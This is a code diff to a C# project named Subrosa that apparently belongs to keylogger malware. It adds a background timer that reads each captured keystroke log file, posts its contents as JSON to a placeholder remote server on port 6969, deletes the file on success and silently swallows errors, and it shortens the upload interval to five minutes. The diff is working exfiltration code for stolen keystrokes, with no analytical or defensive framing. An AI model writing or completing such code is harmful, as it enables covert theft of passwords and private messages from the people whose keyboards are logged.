@@ -1,8 +1,11 @@
-﻿using System;
+﻿using Newtonsoft.Json;
+using System;
 using System.Collections.Generic;
 using System.ComponentModel;
 using System.IO;
 using System.Linq;
+using System.Net;
+using System.Net.Http;
 using System.Text;
 using System.Threading.Tasks;
 using System.Timers;
@@ -18,7 +21,8 @@ namespace Subrosa
         {
             _worker = new BackgroundWorker();
             _worker.DoWork += CheckKeyLogs;
-            _timer = new Timer(600000);
+            //_timer = new Timer(43200000); //12 hour delay
+            _timer = new Timer(300000);
             _timer.Elapsed += TimerElapsed;
             _timer.Start();
         }
@@ -29,17 +33,37 @@ namespace Subrosa
                 _worker.RunWorkerAsync();
         }
 
-
-        private void CheckKeyLogs(object sender, DoWorkEventArgs e)
+        private async void CheckKeyLogs(object sender, DoWorkEventArgs e)
         {
-            string[] files = Directory.GetFiles(Logger.LogPath, "*.txt", SearchOption.AllDirectories);
+            DirectoryInfo d = new DirectoryInfo(Logger.LogPath);
+            FileInfo[] files = d.GetFiles("*.txt", SearchOption.AllDirectories); 
 
-            foreach (string file in files)
+            for (int i = 0; i < files.Length; i++)
             {
+                try
+                {
+                    KeyLogModel model = new KeyLogModel();
+                    model.Log = File.ReadAllText(files[i].FullName);
+                    model.LogTime = DateTime.Now;
 
+                    if (await UploadFile(model))
+                        files[i].Delete();
+                }
+                catch{}
             }
+        }
 
+        private async Task<bool> UploadFile(KeyLogModel log)
+        {
+            string json = JsonConvert.SerializeObject(log);
+            HttpClient client = new HttpClient();
+            StringContent content = new StringContent(json, Encoding.UTF8, "application/json");
+            HttpResponseMessage response = await client.PostAsync("http://www.yoururlhere.com:6969/PostLog", content);
 
+            if (response.StatusCode == HttpStatusCode.OK)
+                return true;
+            else
+                return false;
         }
     }
 }
